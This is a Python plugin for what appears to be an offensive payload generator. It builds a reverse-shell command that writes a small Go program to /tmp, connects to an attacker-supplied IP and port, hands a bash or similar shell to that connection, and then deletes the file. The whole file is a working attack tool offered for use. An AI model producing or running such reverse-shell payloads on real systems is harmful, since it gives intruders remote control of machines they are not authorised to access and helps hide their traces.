from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[ReverseShell][TCP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        self.shell = """echo 'package main;import"os/exec";import"net";func main(){"""
        self.shell += """c,_:=net.Dial("tcp",
        "{}:{}");cmd:=exec.Command("{}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()""".format(
            self.args.ip, self.args.port, self.args.shell)
        self.shell += """}' > /tmp/t.go && go run
        /tmp/t.go && rm /tmp/t.go"""
